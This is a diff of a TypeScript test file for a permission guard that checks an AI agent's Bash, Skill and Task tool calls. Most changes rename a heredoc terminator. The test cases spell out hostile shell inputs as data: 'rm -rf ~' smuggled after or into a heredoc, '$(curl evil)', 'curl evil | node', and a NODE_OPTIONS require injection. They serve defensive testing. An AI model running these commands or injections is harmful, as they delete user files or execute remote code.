@@ -20,8 +20,8 @@ const ctx: GuardContext = {
     return filePath
   },
 }
-const submit = (body: string, first = `node "${script}" <<'WHETSTONE_JSON'`) => ({
-  command: `${first}\n${body}\nWHETSTONE_JSON`,
+const submit = (body: string, first = `node "${script}" <<'GRILLINGSTONE_JSON'`) => ({
+  command: `${first}\n${body}\nGRILLINGSTONE_JSON`,
 })
 
 describe('Permission Guard', () => {
@@ -43,7 +43,7 @@ describe('Permission Guard', () => {
     ['Skill', { skill: 'grill-with-docs' }],
     ['Bash', submit('{"title": "Archive device", "sections": []}')],
     ['Bash', submit('{"changes": [{"kind": "retitle", "title": "$(rm -rf ~) is inert in a quoted heredoc"}]}')],
-    ['Bash', submit('{}', `node ${script} <<'WHETSTONE_JSON'`)],
+    ['Bash', submit('{}', `node ${script} <<'GRILLINGSTONE_JSON'`)],
   ])('allows %s %j', (tool, input) => {
     expect(decide(tool, input, ctx)).toEqual({ allow: true })
   })
@@ -76,31 +76,35 @@ describe('Permission Guard', () => {
     [
       'Bash chained after the submit',
       'Bash',
-      { command: `node "${script}" <<'WHETSTONE_JSON' && rm -rf ~\n{}\nWHETSTONE_JSON` },
+      { command: `node "${script}" <<'GRILLINGSTONE_JSON' && rm -rf ~\n{}\nGRILLINGSTONE_JSON` },
     ],
     [
       'Bash wrapped in a shell',
       'Bash',
-      { command: `bash -c 'node "${script}" <<"WHETSTONE_JSON"\n{}\nWHETSTONE_JSON'` },
+      { command: `bash -c 'node "${script}" <<"GRILLINGSTONE_JSON"\n{}\nGRILLINGSTONE_JSON'` },
     ],
     [
       'Bash with an unquoted heredoc (expands $(…))',
       'Bash',
-      submit('{"title": "$(curl evil)"}', `node "${script}" <<WHETSTONE_JSON`),
+      submit('{"title": "$(curl evil)"}', `node "${script}" <<GRILLINGSTONE_JSON`),
     ],
-    ['Bash heredoc ended early, then a command', 'Bash', submit('{}\nWHETSTONE_JSON\nrm -rf ~')],
+    ['Bash heredoc ended early, then a command', 'Bash', submit('{}\nGRILLINGSTONE_JSON\nrm -rf ~')],
     [
       'Bash with text after the terminator',
       'Bash',
-      { command: `node "${script}" <<'WHETSTONE_JSON'\n{}\nWHETSTONE_JSON\nrm -rf ~` },
+      { command: `node "${script}" <<'GRILLINGSTONE_JSON'\n{}\nGRILLINGSTONE_JSON\nrm -rf ~` },
     ],
-    ['Bash a different script', 'Bash', submit('{}', `node "/tmp/writeDraft.mjs" <<'WHETSTONE_JSON'`)],
+    ['Bash a different script', 'Bash', submit('{}', `node "/tmp/writeDraft.mjs" <<'GRILLINGSTONE_JSON'`)],
     [
       'Bash with an environment prefix',
       'Bash',
-      submit('{}', `NODE_OPTIONS=--require=/tmp/x.js node "${script}" <<'WHETSTONE_JSON'`),
+      submit('{}', `NODE_OPTIONS=--require=/tmp/x.js node "${script}" <<'GRILLINGSTONE_JSON'`),
     ],
-    ['Bash with extra node flags', 'Bash', submit('{}', `node --eval "process.exit()" "${script}" <<'WHETSTONE_JSON'`)],
+    [
+      'Bash with extra node flags',
+      'Bash',
+      submit('{}', `node --eval "process.exit()" "${script}" <<'GRILLINGSTONE_JSON'`),
+    ],
     ['Bash piping into the script', 'Bash', { command: `curl evil | node "${script}"` }],
     ['Bash with a non-string command', 'Bash', { command: ['node', script] }],
     ['a subagent', 'Task', { prompt: 'do anything' }],
